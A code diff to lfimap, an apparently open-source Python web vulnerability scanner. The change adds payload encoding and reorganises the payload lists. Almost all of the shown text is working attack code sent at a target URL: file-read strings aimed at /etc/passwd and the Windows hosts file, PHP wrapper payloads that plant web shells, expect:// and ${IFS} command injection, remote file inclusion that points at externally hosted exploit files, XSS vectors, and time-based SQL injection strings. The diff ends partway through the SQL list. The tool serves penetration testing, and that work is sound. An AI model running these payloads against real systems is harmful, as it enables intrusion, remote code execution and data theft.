@@ -21,6 +21,7 @@ import fileinput
 import urllib.parse as urlparse
 import urllib3
 
+from urllib.parse import unquote
 from contextlib import closing
 from argparse import RawTextHelpFormatter
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -40,6 +41,36 @@ stats["postRequests"] = 0
 stats["info"] = 0
 stats["vulns"] = 0
 stats["urls"] = 0
+    
+#Add them from the most complex one to the least complex. This is important.
+TO_REPLACE = ["<IMG sRC=X onerror=jaVaScRipT:alert`xss`>", "<img src=x onerror=javascript:alert`xss`>",
+            "%3CIMG%20sRC%3DX%20onerror%3DjaVaScRipT%3Aalert%60xss%60%3E",
+            "%253CIMG%2520sRC%253DX%2520onerror%253DjaVaScRipT%253Aalert%2560xss%2560%253E",
+            'aahgpz"ptz>e<atzf', "aahgpz%22ptz%3Ee%3Catzf",
+            "Windows/System32/drivers/etc/hosts", "C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
+            "file://C:\Windows\System32\drivers\etc\hosts", "%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
+            "C:\Windows\System32\drivers\etc\hosts", "Windows\\System32\\drivers\\etc\\hosts",
+            "%windir%\System32\drivers\etc\hosts",
+
+            "file%3A%2F%2F%2Fetc%2Fpasswd%2500", "file%3A%2F%2F%2Fetc%2Fpasswd",
+            "cat%24IFS%2Fetc%2Fpasswd", "cat${IFS%??}/etc/passwd", "/sbin/cat%20/etc/passwd",
+            "/sbin/cat /etc/passwd", "cat%20%2Fetc%2Fpasswd",
+            "cat /etc/passwd", "%2Fetc%2Fpasswd", "/etc/passwd",
+            "ysvznc", "ipconfig",
+            ]
+
+KEY_WORDS = ["root:x:0:0", "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
+            "<img src=x onerror=javascript:alert`xss`>",
+            "cm9vdDp4OjA", "Ond3dy1kYX", "ebbg:k:0:0", "d3d3LWRhdG", "aahgpz\"ptz>e<atzf",
+            "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0", "ZGFlbW9uOng6",
+            "; for 16-bit app support", "sample HOSTS file used by Microsoft",
+            "iBvIG8gdCA6IHggOiA", "OyBmb3IgMTYtYml0IGFwcCBzdXBw", "c2FtcGxlIEhPU1RTIGZpbGUgIHVzZWQgYnkgTWljcm9zb2", 
+            "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
+            "; sbe 16-ovg ncc fhccbeg", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
+             ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
+            "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x", "PD9w",
+            "961bb08a95dbc34397248d92352da799", "PCFET0NUWVBFIGh0b",
+            "PCFET0N", "PGh0b"]
 
 scriptDirectory = os.path.dirname(__file__)
 
@@ -51,7 +82,7 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
 
 def serve_forever():
     global webDir
-    
+
     socketserver.TCPServer.allow_reuse_address = True
     try:
         with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
@@ -90,6 +121,21 @@ class ICMPThread(threading.Thread):
     def setResult(self, boolean):
         self.result = boolean
 
+def base64_encode(string):
+    return base64.b64encode(bytes(string, 'utf-8')).decode()
+
+def urlencode(string):
+    return urlparse.quote(string, safe='')
+
+def encode(payload):
+    if(args.encodings):
+        for encoding in args.encodings:
+            if(encoding == "B"):
+                payload = base64_encode(payload)
+            elif(encoding == "U"):
+                payload = urlencode(payload)
+    return payload
+
 #Used to validate URL(s), before testing happens
 def HEAD(url, headersData, proxy):
     stats["headRequests"] += 1
@@ -120,7 +166,6 @@ def GET(url, headers, proxy, exploitType, exploitMethod, exploit = False):
 
     return res, doContinue
 
-
 def POST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit = False):
     doContinue = True
     res = None
@@ -146,24 +191,25 @@ def POST(url, headersData, postData, proxy, exploitType, exploitMethod, exploit 
 
 def prepareHeaders():
     user_agents = [
-                "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
-                "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
-                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
-                "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
-                "Mozilla/3.01 (Macintosh; PPC)",
-                "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
-                "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
-                "Opera/8.00 (Windows NT 5.1; U; en)",
-                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
-                  ]                                                                                                                                                                             
-    headers = {}                                                                                                                                                                                
+            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
+            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
+            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
+            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
+            "Mozilla/3.01 (Macintosh; PPC)",
+            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
+            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
+            "Opera/8.00 (Windows NT 5.1; U; en)",
+            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
+            ]                                                                                                                                                                             
+    headers = {}
+
     if(args.agent):
         headers['User-Agent'] = agent                                                                                                                                                     
     else:                                                                                                                                                                    
         headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
     if(args.referer):
         headers['Referer'] = referer
-    
+
     headers['Accept'] = '*/*'
     headers['Connection'] = 'Close'
     return headers
@@ -190,42 +236,29 @@ def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, att
 
 def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable = False):
 
-    #Add them from the most complex one to the least complex. This is important.
-    TO_REPLACE = ["<IMG sRC=X onerror=jaVaScRipT:alert`xss`>", "aahgpz\"ptz>e<atzf", 
-                  "Windows/System32/drivers/etc/hosts", "cat%24IFS%2Fetc%2Fpasswd",
-                  "cat${IFS%??}/etc/passwd", "cat%20%2Fetc%2Fpasswd", "/sbin/cat%20/etc/passwd",
-                  "/sbin/cat /etc/passwd", "system('cat%20/etc/passwd')", "system%28%27ipconfig",
-                  "%windir%\System32\drivers\etc\hosts", "C:\Windows\System32\drivers\etc\hosts",
-                  "file%3A%2F%2F%2Fetc%2Fpasswd%2500", "file%3A%2F%2F%2Fetc%2Fpasswd",
-                  "cat%20/etc/passwd", "cat /etc/passwd", "/etc/passwd",
-                  "file://C:\Windows\System32\drivers\etc\hosts", 
-                  "Windows%5CSystem32%5Cdrivers%5Cetc%5Chosts","Windows\\System32\\drivers\\etc\\hosts",
-                  "/ysvznc", "ipconfig",
-                  "/961bb08a95dbc34397248d92352da799", "/.php.txt", "/.php"]
-    
+
     if(scriptName != ""):
         TO_REPLACE.append(scriptName)
         TO_REPLACE.append(scriptName+".php")
         TO_REPLACE.append(scriptName+"%00")
-    
+
 
     if(args.lhost != None):
-        TO_REPLACE.append("ping -c 1 " + args.lhost)
+        TO_REPLACE.append("ping%20-c%201 " + args.lhost)
         TO_REPLACE.append("ping%20-c%201%20" + args.lhost)
-        TO_REPLACE.append("ping -n 1 " + args.lhost)
+        TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
         TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
         TO_REPLACE.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
-    
+
     if(checkPayload(req) or cmdInjectable):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
                 u = getVal.replace(TO_REPLACE[i], tempArg)
                 p = postVal.replace(TO_REPLACE[i], tempArg)
-                
                 if("windows" in TO_REPLACE[i].lower() or "ipconfig" in TO_REPLACE[i].lower() or "Windows IP Configuration" in req.text):
                     os = "windows"
                 else: os = "linux"
-
+                
                 exploit = addToExploits(req, reqType, explType, u, p, headers, attackType, os)
                 
                 #Print finding
@@ -251,21 +284,21 @@ def test_file_trunc(url):
         print("[i] Testing file wrapper inclusion...")
     
     tests = []
-    tests.append("file:///etc/passwd")
-    tests.append("file:///etc/passwd%00")
+    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd")
+    tests.append("file%3A%2F%2F%2Fetc%2Fpasswd%2500")
     
-    tests.append("file://C:\Windows\System32\drivers\etc\hosts")
-    tests.append("file://C:\Windows\System32\drivers\etc\hosts%00")
+    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
+    tests.append("file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
 
     if(not args.postreq):
         for i in range(len(tests)):
-            u = url.replace(args.param, tests[i])
+            u = url.replace(args.param, encode(tests[i]))
             
             _,br = GET(u, headers, proxies, "LFI", "FILE")
             if(not br): return
     else: 
         for i in range(len(tests)):
-            postTest = args.postreq.replace(args.param, tests[i])
+            postTest = args.postreq.replace(args.param, encode(tests[i]))
             
             _, br = POST(url, headers, postTest, proxies, "LFI", "FILE")
             if(not br): return
@@ -278,7 +311,7 @@ def test_trunc(url):
         with open(truncWordlist, "r") as f:
             for line in f:
                 line = line.replace("\n", "")
-                u = url.replace(args.param, line)
+                u = url.replace(args.param, encode(line))
                 
                 _, br = GET(u, headers, proxies, "LFI", "TRUNC")
                 if(not br): return
@@ -287,7 +320,7 @@ def test_trunc(url):
             for line in f:
                 line = line.replace("\n", "")
 
-                postTest = args.postreq.replace(args.param, line)
+                postTest = args.postreq.replace(args.param, encode(line))
                 _, br = POST(url, headers, postTest, proxies, "LFI", "TRUNC")
                 if(not br): return
     return
@@ -338,12 +371,12 @@ def test_cmd_injection(url):
     
     for test in cmdList:
         if(not args.postreq):
-            u = url.replace(args.param, test)
+            u = url.replace(args.param, encode(test))
             _, br = GET(u, headers, proxies, "RCE", "CMD")
             if(not br): return
     
         else:
-            postTest = args.postreq.replace(args.param, test)
+            postTest = args.postreq.replace(args.param, encode(test))
             _, br = POST(url, headers, postTest, proxies, "RCE", "CMD")
             if(not br): return
 
@@ -356,20 +389,20 @@ def test_cmd_injection(url):
         t.start()
 
         icmpTests = []
-        icmpTests.append(";ping%20-c%201;" + args.lhost)
-        icmpTests.append(";ping%20-n%201;" + args.lhost)
+        icmpTests.append(";ping -c 1;" + args.lhost)
+        icmpTests.append(";ping -n 1;" + args.lhost)
         icmpTests.append(";ping%24%7BIFS%25%3F%3F%7D-c%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
         icmpTests.append(";ping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0};".format(args.lhost))
         
         for test in icmpTests:
             if(args.postreq):
-                postTest = args.postreq.replace(args.param, test)
+                postTest = args.postreq.replace(args.param, encode(test))
                 _, br = POST(url, headers, postTest, proxies, "RCE", "CMD")
                 if(t.getResult() == True):
                     t.setResult(False)
                     if(not br): return
             else:
-                u = url.replace(args.param, test)
+                u = url.replace(args.param, encode(test))
                 _, br = GET(u, headers, proxies, "RCE", "CMD")
                 if(t.getResult() == True):
                     t.setResult(False)
@@ -380,21 +413,20 @@ def test_xss(url):
         print("[i] Testing for XSS...")
     
     xssTest = []
-    xssTest.append("<IMG sRC=X onerror=jaVaScRipT:alert`xss`>")
-    xssTest.append("aahgpz\"ptz>e<atzf")
+    xssTest.append("%3CIMG%20sRC%3DX%20onerror%3DjaVaScRipT%3Aalert%60xss%60%3E")
+    xssTest.append("%253CIMG%2520sRC%253DX%2520onerror%253DjaVaScRipT%253Aalert%2560xss%2560%253E")
+    xssTest.append("aahgpz%22ptz%3Ee%3Catzf")
+    xssTest.append("aahgpz%2522ptz%253Ee%253Catzf")
 
     for test in xssTest:
         u = url.replace(args.param, test)
-
         if(args.postreq): 
             res, br = POST(u, headers, args.postreq.replace(args.param, test), proxies, "XSS", "XSS")
         else:
-            res, br = GET(u, headers, proxies, "XSS", "XSS") 
-
-        if(test in res.text):
+            res, br = GET(u, headers, proxies, "XSS", "XSS")
+        if(unquote(test) in res.text and unquote(test) in KEY_WORDS):
             print("    Value '" + test + "' is reflected.")
 
-            #stats["vulns"] += 1
             #Check for headers that could potentially prevent XSS and let user know about them
             if('Content-Security-Policy' in res.headers):
                 print("[i] CSP could prevent XSS and is set to: '" + res.headers['Content-Security-Policy'] + "'")
@@ -412,15 +444,15 @@ def test_filter(url):
     global scriptName
 
     tests = []
-    tests.append("php://filter/resource=/etc/passwd")
-    tests.append("php://filter/resource=/etc/passwd%00")
-    tests.append("php://filter/convert.base64-encode/resource=/etc/passwd")
-    tests.append("php://filter/convert.base64-encode/resource=/etc/passwd%00")
+    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd")
+    tests.append("php%3A%2F%2Ffilter%2Fresource%3D%2Fetc%2Fpasswd%2500")
+    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd")
+    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%2500")
         
-    tests.append("php://filter/resource=..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts")
-    tests.append("php://filter/resource=..\..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts%00")
-    tests.append("php://filter/resource=C:\Windows\System32\drivers\etc\hosts") 
-    tests.append("php://filter/resource=C:\Windows\System32\drivers\etc\hosts%00") 
+    tests.append("php%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts")
+    tests.append("p%3A%2F%2Ffilter%2Fresource%3D..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500")
+    tests.append("php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts") 
+    tests.append("php%3A%2F%2Ffilter%2Fresource%3DC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts%2500") 
     
     script = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))
     scriptName = script[0]
@@ -429,18 +461,18 @@ def test_filter(url):
     if(scriptName == ""):
         scriptName = "index"
     
-    tests.append("php://filter/convert.base64-encode/resource=" + scriptName)
-    tests.append("php://filter/convert.base64-encode/resource=" + scriptName + ".php")
-    tests.append("php://filter/convert.base64-encode/resource=" + scriptName + "%00")
+    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName)
+    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + ".php")
+    tests.append("php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D" + scriptName + "%2500")
     
     if(not args.postreq):
         for i in range(len(tests)):
-            u = url.replace(args.param, tests[i])
+            u = url.replace(args.param, encode(tests[i]))
             _, br = GET(u, headers, proxies, "LFI", "FILTER")
             if(not br): return
     else:
         for i in range(len(tests)):
-            postTest = args.postreq.replace(args.param, tests[i])
+            postTest = args.postreq.replace(args.param, encode(tests[i]))
             _, br = POST(url, headers, postTest, proxies, "LFI", "FILTER")
             if(not br): return
 
@@ -453,49 +485,48 @@ def test_data(url):
     tests = []
     
     if(not args.postreq):
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
-        tests.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
+        tests.append("data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd")
+        tests.append("data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
         
         for i in range(len(tests)):
-            u = url.replace(args.param, tests[i])
+            u = url.replace(args.param, encode(tests[i]))
             _, br = GET(u, headers, proxies, "RCE", "DATA")
             if(not br): return
     else:
         urls = []
-        urls.append("?c=cat%20/etc/passwd")
+        urls.append("?c=cat%20%2Fetc%2Fpasswd")
         urls.append("?c=ipconfig")
 
-        test = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
+        test = "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
 
         for i in range(len(urls)):
-            postTest = args.postreq.replace(args.param, test)
-            _, br = POST(url + urls[i], headers, postTest, proxies, "RCE", "DATA")
+            postTest = args.postreq.replace(args.param, encode(test))
+            _, br = POST(url + encode(urls[i]), headers, postTest, proxies, "RCE", "DATA")
             if(not br): return
     return
 
 def test_input(url):
     if(args.postreq):
-        if(args.verbose): print("[-] $_POST arguments are not LFI-able using php://input. Skipping input wrapper test...")
+        if(args.verbose): print("[i] POST arguments are not expoitable using input wrapper. Skipping input wrapper test...")
         return
 
     if(args.verbose):
         print("[i] Testing input wrapper...")
 
     tests = []
-    tests.append("php://input&cmd=cat%20/etc/passwd")
+    tests.append("php%3a%2f%2finput&cmd=cat%20%2Fetc%2Fpasswd")
 
-    tests.append("php://input&cmd=ipconfig")
+    tests.append("php%3a%2f%2finput&cmd=ipconfig")
     
     posts = []
     posts.append("<?php echo(shell_exec($_GET['cmd']));?>")
-    posts.append("<?php echo(exec($_GET['cmd']));?>")
     posts.append("<?php echo(passthru($_GET['cmd']));?>")
     posts.append("<?php echo(system($_GET['cmd']));?>")
     
     for i in range(len(tests)):
-        u = url.replace(args.param, tests[i])
+        u = url.replace(args.param, encode(tests[i]))
         for j in range(len(posts)):
-            _, br = POST(u, headers, posts[j], proxies, "RCE", "INPUT")
+            _, br = POST(u, headers, encode(posts[j]), proxies, "RCE", "INPUT")
             if(not br): return
     return
 
@@ -505,22 +536,18 @@ def test_expect(url):
             print("[i] Testing expect wrapper...")
 
     tests = []
-    tests.append("expect://etc/passwd")
-    tests.append("expect://cat%20/etc/passwd")
-    tests.append("expect://cat%20/etc/passwd")
-    tests.append("expect:%2F%2Fcat%20%2Fetc%2Fpasswd")
-
-    tests.append("expect:%2F%2Fipconfig")
+    tests.append("expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd")
+    tests.append("expect%3A%2F%2Fipconfig")
 
     if(not args.postreq):
         for i in range(len(tests)):
-            u = url.replace(args.param, tests[i])
-        
+            u = url.replace(args.param, encode(tests[i]))
+
             _, br = GET(u, headers, proxies, "RCE", "EXPECT")
             if(not br): return
     else:
         for i in range(len(tests)):
-            postTest = args.postreq.replace(args.param, tests[i])
+            postTest = args.postreq.replace(args.param, encode(tests[i]))
             _, br = POST(url, headers, postTest, proxies, "RCE", "EXPECT")
             if(not br):  return
     return
@@ -543,26 +570,23 @@ def test_rfi(url):
 
             threading.Thread(target=serve_forever).start()
             rfiTest = []
-            rfiTest.append("http://{0}:{1}/ysvznc".format(args.lhost, str(rfi_test_port)))
-            rfiTest.append("http://{0}:{1}/ysvznc%00".format(args.lhost, str(rfi_test_port)))
-            rfiTest.append("http://{0}:{1}/.php".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/.php.txt".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/961bb08a95dbc34397248d92352da799".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/ysvznc.gif".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/ysvznc.png".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/ysvznc.jpg".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/ysvznc.jsp".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/ysvznc.html".format(args.lhost, str(rfi_test_port))) 
-            rfiTest.append("http://{0}:{1}/ysvznc.php".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc".format(args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc%00".format(args.lhost, str(rfi_test_port)))
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.gif".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.png".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jpg".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.jsp".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.html".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http%3A%2F%2F{0}%3A{1}%2Fysvznc.php".format(args.lhost, str(rfi_test_port))) 
 
             for test in rfiTest:
-                u = url.replace(args.param, test)
+                u = url.replace(args.param, encode(test))
 
                 if(not args.postreq):
                     _, br = GET(u, headers, proxies, "RFI", "RFI")
                     if(not br): return
                 else:
-                    postTest = args.postreq.replace(args.param, test)
+                    postTest = args.postreq.replace(args.param, encode(test))
                     _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
                     if(not br): return
         except:
@@ -571,24 +595,21 @@ def test_rfi(url):
 
     #Internet RFI test
     pylds = []
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/.php")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/.php.txt")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/961bb08a95dbc34397248d92352da799")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.gif")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.png")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.jpg")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.html")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.jsp")
-    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.php")
+    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
+    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")
+    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jpg")
+    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
+    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
+    pylds.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
     
     for pyld in pylds: 
         try:
             if(not args.postreq):
-                u = url.replace(args.param, pyld)
+                u = url.replace(args.param, encode(pyld))
                 _, br = GET(u, headers, proxies, "RFI", "RFI")
                 if(not br): return
             else:
-                postTest = args.postreq.replace(args.param, pyld)
+                postTest = args.postreq.replace(args.param, encode(pyld))
                 _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
                 if(not br): return
         except:
@@ -607,7 +628,8 @@ def test_heuristics(url):
     #
     
     tests = []
-    tests.append("/?!%$$%!?/")
+    # /?!%$$%!?/
+    tests.append("%2F%3F%21%25%24%24%25%21%3F%2F")
     
     fiErrors = ["warning", "include(", "require(", "fopen(", "fpassthru(", "readfile(", "fread(", "fgets("]
     sqlErrors = ["you have an error in your sql syntax", "unclosed qutation mask after the character string",
@@ -625,7 +647,7 @@ def test_heuristics(url):
         for test in tests:
             u = url.replace(args.param, test)
             res, _ = GET(u, headers, proxies, "INFO", "INFO")
-            if(fiErrors[0] in res.text):
+            if(fiErrors[0] in res.text.lower()):
                 for i in range(1,len(fiErrors)):
                     if(fiErrors[i] in res.text.lower()):
                         if("c:" in res.text or "d:" in res.text.lower() or "windows" in res.text.lower()):
@@ -644,10 +666,10 @@ def test_heuristics(url):
         for test in tests:
             postTest = args.postreq.replace(args.param, test)
             res, _ = POST(url, headers, postTest, proxies, "INFO", "INFO")
-            if(fiErrors[0] in res.text):
+            if(fiErrors[0] in res.text.lower()):
                 for i in range(1, len(fiErrors)):
-                    if(fiErrors[i] in res.text):
-                        if("/php" in res.text):
+                    if(fiErrors[i] in res.text.lower()):
+                        if("/php" in res.text.lower()):
                             print("[i] Detected linux OS signatures, based on response.")
                         print("[+] Info disclosure -> '" + fiErrors[i] + "' triggered -> '" + url + "' -> HTTP POST -> '" + postTest + "'")
                         stats["info"] += 1
@@ -677,16 +699,16 @@ def test_heuristics(url):
     if("aspnet" in resHeaders):
         print("[+] Discovered possible .NET signatures.")
         stats["info"] += 1
-    if("set-cookie:" in resHeaders and "httponly" not in resHeaders):
-        print("[+] Cookies are set without 'HttpOnly' tag.")
-        stats["info"] += 1
     if("lfimap<>ua" in res.text):
         print("[+] Possible XSS, reflected 'User-Agent' string discovered in response.")
         stats["info"] += 1
     if("lfimap<>referer" in res.text):
         print("[+] Possible XSS, reflected 'Referer' string discovered in response.")
         stats["info"] += 1
-
+    if("/?!%$$%!?/" in res.text):
+        if(args.test_all or args.xss):  
+            print("[+] Possible XSS -> '" + u + "' -> reflection of '/?!%$$%!?/' is discovered in response.")
+        else: print("[+] Possible XSS -> '" + u + "' -> reflection of '/?!%$$%!?/' is discovered in response. Rerun lfimap with '--xss' to test for XSS.")
     return
 
 def test_sqli(url):
@@ -694,51 +716,47 @@ def test_sqli(url):
         print("[i] Testing for blind SQL injection...")
     
     sqli = []
-    sqli.append("1;SELECT SLEEP(5)#")
-    sqli.append("1;SELECT SLEEP(5)")
-    sqli.append("1 AND SLEEP(5)")
-    sqli.append("1 OR SLEEP(5)")
-    sqli.append("1 AND SLEEP(5)#")
-    sqli.append("1 OR SLEEP(5)#")
-    sqli.append("1 RLIKE SLEEP(5)")
-    sqli.append("1 RLIKE SLEEP(5)#")
-    sqli.append("\" or sleep(5)#")
-    sqli.append("' or sleep(5)#")
-    sqli.append("\" or sleep(5)=\"")
-    sqli.append("' or sleep(5)='")
-    sqli.append("1) or sleep(5)#")
-    sqli.append("1' or sleep(5) -- -")
-    sqli.append("\") or sleep(5)=\"")
-    sqli.append("') or sleep(5)='")
-    sqli.append("1)) or sleep(5)#")
-    sqli.append("\")) or sleep(5)=\"")
-    sqli.append("')) or sleep(5)='")
-    sqli.append(";waitfor delay '0:0:5'-- -")
-    sqli.append(");waitfor delay '0:0:5'-- -")
-    sqli.append("';waitfor delay '0:0:5'-- -")
-    sqli.append("\";waitfor delay '0:0:5'-- -")
-    sqli.append("');waitfor delay '0:0:5'-- -")
-    sqli.append("\");waitfor delay '0:0:5'-- -")
-    sqli.append("));waitfor delay '0:0:5'-- -")
-    sqli.append("'));waitfor delay '0:0:5'-- -")
-    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe")
-    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='")
-    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)")
-    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- -")
-    sqli.append("AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#")
-    sqli.append("SLEEP(5)#")
-    sqli.append("SLEEP(5)--")
-    sqli.append("SLEEP(5)=\"")
-    sqli.append("SLEEP(5)='")
-    sqli.append("1 or SLEEP(5)")
-    sqli.append("1 or SLEEP(5)#")
-    sqli.append("1 or SLEEP(5)--")
-    sqli.append("1 or SLEEP(5)=\"")
-    sqli.append("1 or SLEEP(5)='")
-    sqli.append("1 or SLEESLEEPP(5)%23-- -'")
-    sqli.append("1 or SLEESLEEPP(5)='")
-    sqli.append("1' or SLEESLEEPP(5)%23-- -'")
-    sqli.append("\"or SLEESLEEPP(5)%23-- -'")
+    sqli.append("1%3BSELECT%20SLEEP%285%29%23")
+    sqli.append("1%3BSELECT%20SLEEP%285%29")
+    sqli.append("1%20AND%20SLEEP%285%29")
+    sqli.append("1%20OR%20SLEEP%285%29")
+    sqli.append("1%20AND%20SLEEP%285%29%23")
+    sqli.append("1%20RLIKE%20SLEEP%285%29")
